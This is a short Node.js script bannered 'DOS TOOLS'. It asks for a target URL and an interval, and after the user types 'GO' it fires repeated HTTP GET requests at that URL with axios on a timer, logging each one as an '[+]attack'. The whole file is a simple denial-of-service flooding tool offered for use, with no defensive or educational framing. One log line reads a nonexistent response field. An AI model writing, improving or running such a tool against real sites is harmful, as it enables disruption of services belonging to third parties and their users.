const readline = require("readline-sync");
const axios = require("axios");

console.log(`\u001b[32m██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     ███████╗
██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
`);

let url = readline.question(`\u001b[32murl: `);
let interval = parseInt(readline.question(`\u001b[32minterval: `));
let start = readline.question(`\u001b[32mstart[GO]: `);

if (start.toUpperCase() === 'GO') {
    send();
}

function send() {
    setInterval(() => {
        axios.get(url)
            .then(response => {
                console.log(`\u001b[32m[+]attack: ${url}`);
                console.log(`\u001b[32m[+]date: ${response.date}`);
            })
            .catch(error => {
                console.error('Error:', error.message);
            });
    }, interval);
}